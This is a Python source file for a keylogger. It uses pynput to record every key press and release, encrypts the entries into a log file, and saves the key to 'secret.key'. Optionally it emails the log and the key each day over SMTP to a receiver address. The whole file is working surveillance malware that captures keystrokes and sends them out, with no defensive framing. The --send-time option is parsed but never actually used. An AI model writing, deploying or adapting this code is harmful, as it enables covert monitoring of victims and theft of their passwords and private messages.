import os
import sys
import argparse
import logging
import time
from datetime import datetime, timedelta
from pynput import keyboard
from utils import generate_key, save_key, encrypt_data, send_email

def on_press(key, log_file, key_obj):
    try:
        data = f"Key pressed: {key.char}"
    except AttributeError:
        data = f"Special key pressed: {key}"

    encrypted_data = encrypt_data(data, key_obj)
    with open(log_file, "ab") as file:
        file.write(encrypted_data + b'\n')

def on_release(key, log_file, key_obj):
    try:
        key_char = key.char
    except AttributeError:
        key_char = str(key)

    data = f"Key released: {key_char}"
    encrypted_data = encrypt_data(data, key_obj)
    with open(log_file, "ab") as file:
        file.write(encrypted_data + b'\n')

    if key == keyboard.Key.esc:
        return False

def send_log_email(log_file, key_file, email_config):
    """
    Send the log file and key file via email.
    """
    send_email(
        email_config['smtp_server'],
        email_config['port'],
        email_config['sender_email'],
        email_config['sender_password'],
        email_config['receiver_email'],
        "Keylogger Log and Key",
        "Attached are the keylogger log file and the encryption key.",
        [log_file, key_file]
    )

def start_keylogger(log_file, email_config=None, send_time=None):
    key = generate_key()
    save_key(key)

    next_send_time = datetime.now() + timedelta(days=1) if send_time else None

    with keyboard.Listener(
        on_press=lambda event: on_press(event, log_file, key),
        on_release=lambda event: on_release(event, log_file, key)
    ) as listener:
        try:
            while True:
                listener.join(1)
                if send_time and datetime.now() >= next_send_time:
                    send_log_email(log_file, "secret.key", email_config)
                    next_send_time += timedelta(days=1)
        except Exception as e:
            logging.error(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="keylogger")
    parser.add_argument("--log-file", default="log.txt", help="Path to the log file")
    parser.add_argument("--send-email", action="store_true", help="Enable email sending")
    parser.add_argument("--send-time", default="22:00", help="Time to send the email (HH:MM)")
    parser.add_argument("--smtp-server", help="SMTP server for sending email")
    parser.add_argument("--port", type=int, help="SMTP server port")
    parser.add_argument("--sender-email", help="Sender email address")
    parser.add_argument("--sender-password", help="Sender email password")
    parser.add_argument("--receiver-email", help="Receiver email address")
    args = parser.parse_args()

    email_config = None
    send_time = None
    if args.send_email:
        email_config = {
            'smtp_server': args.smtp_server,
            'port': args.port,
            'sender_email': args.sender_email,
            'sender_password': args.sender_password,
            'receiver_email': args.receiver_email
        }
        send_time = datetime.strptime(args.send_time, "%H:%M").time()

    start_keylogger(args.log_file, email_config, send_time)

if __name__ == "__main__":
    main()
